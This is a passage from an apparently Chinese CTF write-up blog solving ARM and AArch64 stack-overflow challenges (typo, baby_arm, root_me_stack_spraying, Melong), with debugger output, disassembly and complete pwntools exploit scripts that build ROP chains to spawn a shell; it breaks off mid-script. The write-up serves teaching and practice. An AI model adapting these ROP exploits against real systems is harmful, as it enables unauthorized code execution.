class="line">+-------------+</span><br></pre></td></tr></table></figure><p>本地调试用 gdb 的 cycli 功能得出溢出长度：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">……</span><br><span class="line">───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────</span><br><span class="line">Invalid address 0x62616164</span><br><span class="line">……</span><br><span class="line"></span><br><span class="line">pwndbg&gt; cyclic -l 0x62616164</span><br><span class="line">112</span><br></pre></td></tr></table></figure><p>字符串输入不能和 amd 架构可以边调试边输入，要用脚本输入。最后得出 padding 112 。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;./typo&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;remote_addr&quot;</span>, remote_port)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&quot;./typo&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment">#p = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabi&quot;, &quot;./typo&quot;])</span></span><br><span class="line">    <span class="comment">#p = process([&#x27;qemu-arm&#x27;,&quot;-g&quot;,&quot;1234&quot;,&quot;./typo&quot;])</span></span><br><span class="line">    p = process([<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&quot;./typo&quot;</span>])</span><br><span class="line">elf = ELF(<span class="string">&quot;./typo&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_r0_r4_pc = <span class="number">0x00020904</span></span><br><span class="line">str_binsh = <span class="number">0x0006c384</span></span><br><span class="line">system = <span class="number">0x000110B4</span></span><br><span class="line">padding = <span class="number">112</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*padding + p32(pop_r0_r4_pc) + p32(str_binsh)*<span class="number">2</span> + p32(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;quit&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># p.sendline(&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&quot;)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="2018-上海市大学生网络安全大赛-baby-arm"><a href="#2018-上海市大学生网络安全大赛-baby-arm" class="headerlink" title="2018 上海市大学生网络安全大赛 - baby_arm"></a>2018 上海市大学生网络安全大赛 - baby_arm</h2><h3 id="基本情况-1"><a href="#基本情况-1" class="headerlink" title="基本情况"></a>基本情况</h3><p>Aarch64 架构只打开 nx 保护，是个动态连接的程序，qemu 启动要用 -L 指定运行库：<code>qemu-aarch64 -L /usr/aarch64-linux-gnu ./pwn</code></p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171646.png" alt="image-20210122121112367"></p><p>程序一共两次输入，第一次是输入到 bss 段，第二次存在栈溢出。</p><p>看一看栈溢出部分汇编，aarch64 栈分布与 x86 有点不一样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var_50          &#x3D; -0x50</span><br><span class="line">STP             X29, X30, [SP,#var_50]!;压栈将x29x30压入sp-0x50，之后将sp更新为sp-0x50</span><br><span class="line">MOV             X29, SP;新栈基地址</span><br><span class="line">ADD             X0, X29, #0x10;x0&#x3D;x29-0x10</span><br><span class="line">MOV             X2, #0x200 ; nbytes</span><br><span class="line">MOV             X1, X0  ; buf</span><br><span class="line">MOV             W0, #0  ; fd</span><br><span class="line">BL              .read</span><br><span class="line">NOP</span><br><span class="line">LDP             X29, X30, [SP+0x50+var_50],#0x50;出栈</span><br><span class="line">RET</span><br></pre></td></tr></table></figure><p>这里栈溢出的话不能修改 sub_4007F0 的 rip ，修改的是上层函数的返回地址。利用 mprotect 给 bss 写入位置加上运行权限。mprotect 需要 3 个参数，对应 x0-x3 寄存器，ROPgadget 没有找到合适的。</p><h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h3><p>在 start 函数中找到 init 函数：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171647.png" alt="image-20210122140550188"></p><p>结构体和 x86 的差不多：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171648.png" alt="image-20210122141146030"></p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171649.png" alt="image-20210122141034176"></p><p>0x4008CC 开始从栈上提取值到寄存器，读懂寻址方式就行。栈溢出填充变量后马上调用 0x4008CC 变量在内存布局如下：</p><table><thead><tr><th align="center">内存地址</th><th align="center">内存布局</th><th>备注</th></tr></thead><tbody><tr><td align="center">低</td><td align="center">……</td><td>padding</td></tr><tr><td align="center"></td><td align="center">……</td><td>Rbp</td></tr><tr><td align="center"></td><td align="center">0x4008CC</td><td>Rip</td></tr><tr><td align="center"></td><td align="center">X29</td><td></td></tr><tr><td align="center"></td><td align="center">X30</td><td></td></tr><tr><td align="center"></td><td align="center">X19</td><td></td></tr><tr><td align="center"></td><td align="center">X20</td><td></td></tr><tr><td align="center"></td><td align="center">X21</td><td></td></tr><tr><td align="center"></td><td align="center">X22</td><td></td></tr><tr><td align="center"></td><td align="center">X23</td><td></td></tr><tr><td align="center">高</td><td align="center">X24</td><td></td></tr><tr><td align="center"></td><td align="center"></td><td></td></tr></tbody></table><p>然后就是 0x4008AC 给参数寄存器赋值并调用函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">MOV             X2, X22</span><br><span class="line">MOV             X1, X23</span><br><span class="line">MOV             W0, W24</span><br><span class="line">ADD             X19, X19, #1</span><br><span class="line">BLR             X3</span><br><span class="line">CMP             X19, X20</span><br><span class="line">B.NE            loc_4008AC</span><br></pre></td></tr></table></figure><ol><li><p>执行<code>LDR X3,[X21,X19,LSL#3]</code>，那么此句汇编的意义是，将X19的值逻辑左移(Logical Shift Left)三位后加上X21的值，<strong>取其所指向的值</strong>存储在X3寄存器中。控制 x19 为 0 ，就变成 <code>LDR X3,[X21]</code> 。</p></li><li><p>把 X22 寄存器的值作为第三个参数 x2 ；把 X23 寄存器的值作为第二个参数 x1 ；把 X24 寄存器的值（低32位）作为第一个参数 x0 ；</p></li><li><p>给 X19 寄存器的值加一，调用 X3 寄存器<strong>所指向</strong>的函数，也就需要找个已知地址的地方写入 plt 。</p></li><li><p>比较 x19 和 x20 ，不相等就再次调用 0x4008AC ，所用 x20 控制为 1 。</p></li></ol><p>最后得出对照表：</p><table><thead><tr><th align="center">内存地址</th><th align="center">内存布局</th><th>备注</th></tr></thead><tbody><tr><td align="center">低</td><td align="center">……</td><td>padding</td></tr><tr><td align="center"></td><td align="center">……</td><td>Rbp</td></tr><tr><td align="center"></td><td align="center">0x4008CC</td><td>Rip</td></tr><tr><td align="center"></td><td align="center">X29</td><td></td></tr><tr><td align="center"></td><td align="center">X30</td><td></td></tr><tr><td align="center"></td><td align="center">X19</td><td>固定值：0</td></tr><tr><td align="center"></td><td align="center">X20</td><td>固定值：1</td></tr><tr><td align="center"></td><td align="center">X21</td><td>存储调用函数地址：X3</td></tr><tr><td align="center"></td><td align="center">X22</td><td>第三个参数：X2</td></tr><tr><td align="center"></td><td align="center">X23</td><td>第二个参数：X1</td></tr><tr><td align="center">高</td><td align="center">X24</td><td>第一个参数：W0(X0低32位)</td></tr></tbody></table><p>修改完权限之后还需要调用在 bss 段上的 shellcode ，就在上面 payload 上再加调用就行了，得出最后的 payload ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x40</span> </span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)              <span class="comment"># X19</span></span><br><span class="line">payload += p64(<span class="number">0x4008CC</span>)                <span class="comment"># X20</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)               <span class="comment"># X29</span></span><br><span class="line">payload += p64(<span class="number">0x4008AC</span>)                 <span class="comment"># X30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)               <span class="comment"># X19 , X20</span></span><br><span class="line">payload += p64(<span class="number">0x411068</span> + <span class="number">0x100</span>)         <span class="comment"># X21</span></span><br><span class="line">payload += p64(<span class="number">0x7</span>)                      <span class="comment"># X22</span></span><br><span class="line">payload += p64(<span class="number">0x1000</span>)                   <span class="comment"># X23</span></span><br><span class="line">payload += p64(<span class="number">0x411000</span>)                 <span class="comment"># X24</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)               <span class="comment"># X29</span></span><br><span class="line">payload += p64(<span class="number">0x411068</span>)                 <span class="comment"># X30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">0x6</span>                  <span class="comment"># X19 - X24</span></span><br></pre></td></tr></table></figure><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;remote_addr&quot;</span>, remote_port)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/aarch64-linux-gnu&quot;</span>, <span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/aarch64-linux-gnu&quot;</span>, <span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/aarch64-linux-gnu/lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">shell_code = asm(shellcraft.sh())</span><br><span class="line">shell_code = shell_code.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x90&#x27;</span>)</span><br><span class="line">shell_code = shell_code + p64(elf.plt[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x40</span> </span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)              <span class="comment"># X19</span></span><br><span class="line">payload += p64(<span class="number">0x4008CC</span>)                <span class="comment"># X20</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)               <span class="comment"># X29</span></span><br><span class="line">payload += p64(<span class="number">0x4008AC</span>)                 <span class="comment"># X30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)               <span class="comment"># X19 , X20</span></span><br><span class="line">payload += p64(<span class="number">0x411068</span> + <span class="number">0x100</span>)         <span class="comment"># X21</span></span><br><span class="line">payload += p64(<span class="number">0x7</span>)                      <span class="comment"># X22</span></span><br><span class="line">payload += p64(<span class="number">0x1000</span>)                   <span class="comment"># X23</span></span><br><span class="line">payload += p64(<span class="number">0x411000</span>)                 <span class="comment"># X24</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)               <span class="comment"># X29</span></span><br><span class="line">payload += p64(<span class="number">0x411068</span>)                 <span class="comment"># X30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">0x6</span>                  <span class="comment"># X19 - X24</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">p.sendline(shell_code)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="root-me-stack-spraying"><a href="#root-me-stack-spraying" class="headerlink" title="root_me_stack_spraying"></a>root_me_stack_spraying</h2><h3 id="基本情况-2"><a href="#基本情况-2" class="headerlink" title="基本情况"></a>基本情况</h3><p>32 位 arm 架构动态链接程序，打开 nx 保护。存在 scanf 函数栈溢出漏洞。通过调试测试得出溢出 0x44 后，就能控制 pc 寄存器。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171650.png" alt="image-20210124201022270"></p><p>程序中有后门函数：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171651.png" alt="image-20210124201322884"></p><p>ROPgadget 查询如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Gadgets information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x00010634 : pop &#123;fp, pc&#125;</span><br><span class="line">0x0001055c : pop &#123;r0, r1, r4, r8, fp, ip, sp, pc&#125;</span><br><span class="line">0x000103f8 : pop &#123;r3, pc&#125;</span><br><span class="line">0x000105b0 : pop &#123;r4, fp, pc&#125;</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure><p>结合 main 函数中 scanf 附件汇编指令，利用 pop_r3_pc 这个 gadget 可以控制 scanf 实现任意地址写。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171652.png" alt="image-20210124203121632"></p><p>程序中现成有 system ，这里就向 bss 写入 <code>/bin/sh\x00</code> 作为参数调用。然后就是控制 r0 的值，先用 gadget 控制 r3 的值，接着将程序控制到 <code>0x1067c</code> 从而控制 r0 。</p><p>程序劫持到 <code>0x1067c</code> 之后就会一直执行下去，遇到 <code>0x10684</code> 的话就会从 r11 上取值给 pc 而不是用 bss 段上的数据，所以这里还需要提前向 r11 写入一个存储着 exec 函数地址的地址，这个在写入 bss 时一起实现。两段 payload 分别是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*(padding-<span class="number">4</span>) + p32(elf.bss() + <span class="number">0x300</span>)</span><br><span class="line">payload1 += p32(pop_r3_pc)</span><br><span class="line">payload1 += p32(elf.bss() + <span class="number">0x300</span>-<span class="number">0x4</span>*<span class="number">3</span>)  <span class="comment"># R3:write address</span></span><br><span class="line">payload1 += p32(main_scanf)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&quot;/bin/sh\x00&quot;</span> + p32(elf.sym[<span class="string">&#x27;exec&#x27;</span>])</span><br><span class="line">payload2 += p32(pop_r3_pc) + p32(elf.bss() + <span class="number">0x300</span>-<span class="number">0x4</span>*<span class="number">3</span>) + p32(<span class="number">0x0001067C</span>)</span><br><span class="line">payload2 += p32(elf.bss() + <span class="number">0x300</span>-<span class="number">0x4</span>) + p32(<span class="number">0x0001067C</span>)</span><br></pre></td></tr></table></figure><p>实际调试时发现 exec 前面几条函数会覆盖 <code>/bin/sh\x00</code> 前面的四个字节，不过问题不大，将其修改为 <code>xxxx;sh\x00</code> 即可。</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;./root_me_stack_spraying&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;remote_addr&quot;</span>, remote_port)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./root_me_stack_spraying&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./root_me_stack_spraying&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./root_me_stack_spraying&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/arm-linux-gnueabihf/lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_r3_pc = <span class="number">0x000103f8</span></span><br><span class="line">pop_r11_pc = <span class="number">0x00010634</span></span><br><span class="line">padding = <span class="number">0x44</span></span><br><span class="line">main_scanf = <span class="number">0x0001065C</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload1 = &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&quot;</span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*(padding-<span class="number">4</span>) + p32(elf.bss() + <span class="number">0x300</span>)</span><br><span class="line">payload1 += p32(pop_r3_pc)</span><br><span class="line">payload1 += p32(elf.bss() + <span class="number">0x300</span>-<span class="number">0x4</span>*<span class="number">3</span>)  <span class="comment"># R3:write address</span></span><br><span class="line">payload1 += p32(main_scanf)         </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;bss:&quot;</span>+<span class="built_in">hex</span>(elf.bss()))</span><br><span class="line">log.info(<span class="string">&quot;bss:&quot;</span>+<span class="built_in">hex</span>(elf.sym[<span class="string">&#x27;exec&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload2 = &quot;/bin;sh\x00&quot; + p32(elf.sym[&#x27;exec&#x27;])</span></span><br><span class="line"><span class="comment"># payload2 += p32(pop_r3_pc) + p32(elf.bss() + 0x300-0x4*3) + p32(pop_r11_pc)</span></span><br><span class="line"><span class="comment"># payload2 += p32(elf.bss() + 0x300-0x4) + p32(0x0001067C)</span></span><br><span class="line">payload2 = <span class="string">&quot;skye;sh\x00&quot;</span> + p32(elf.sym[<span class="string">&#x27;exec&#x27;</span>])</span><br><span class="line">payload2 += p32(pop_r3_pc) + p32(elf.bss() + <span class="number">0x300</span>-<span class="number">0x4</span>*<span class="number">3</span>) + p32(pop_r11_pc)</span><br><span class="line">payload2 += p32(elf.bss() + <span class="number">0x300</span>-<span class="number">0x4</span>) + p32(<span class="number">0x0001067C</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Codegate2018-Melong"><a href="#Codegate2018-Melong" class="headerlink" title="Codegate2018_Melong"></a>Codegate2018_Melong</h2><ol><li>分析压栈变量个数</li><li>分析rop返回位置</li><li>libc静态加载特性</li></ol><h3 id="基本情况-3"><a href="#基本情况-3" class="headerlink" title="基本情况"></a>基本情况</h3><p>32位ARM动态链接程序，仅开启NX保护。</p><p>程序是一个 BMI 计算器，在 write_diary(len, addr); 存在栈溢出，长度实际上是经过 PT 函数计算 check 函数输入的身高体重数据后，得出的 BMI 指数，addr 对应是 main 函数中的局部变量。</p><p>PT 函数挺奇特的，如果需要控制返回值为输入的 size 就需要满足 if 条件。exc2 一直都没有赋值为 0 ，所以需要利用 malloc 申请失败返回 null 。因此这里输入 -1 ，将返回值设置为 -1 。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171653.png" alt="image-20210123003225618"></p><p>在 PT 中 size 数据类型为 size_t ，在 write_diary 用 unsigned int 存储原本 -1 变成非常大的数，造成栈溢出。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171654.png" alt="image-20210123003805545"></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>和 x86 架构下 ret2libc 的思路一样，只是不同架构 payload 需要调整。</p><p>padding 长度和 x86 一样，可以在 ida 中看出来是 50+4 ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210406171655.png" alt="image-20210123004311891"></p><p><strong>注意在 arm 程序没有 ebp 这个位置的填充</strong>，具体可以从汇编分析得出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUSH    &#123;R11,LR&#125;;将R11+LR指向的内容压栈</span><br><span class="line">ADD     R11, SP, #4;</span><br><span class="line">SUB     SP, SP, #0x50;栈顶向低地址移动0x50</span><br><span class="line">LDR     R3, &#x3D;stdin__GLIBC_2.4;函数体开始</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>只有 R11 一个寄存器压栈了，所以 padding 应该为：50+4</p><p>ROPgadget 能找到合适的 gadget ：<code>0x00011bbc : pop &#123;r0, pc&#125;</code> ，泄露 libc ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = padding+p32(gadget)+p32(got)+p32(plt)</span><br></pre></td></tr></table></figure><p>返回 main 函数无论怎么搞都返回不了。但是<strong>发现 libc 是静态加载的，两次泄露地址都是一样的</strong>，所以直接调用 system :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = padding+p32(gadget)+p32(binsh)+p32(system)</span><br></pre></td></tr></table></figure><h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> 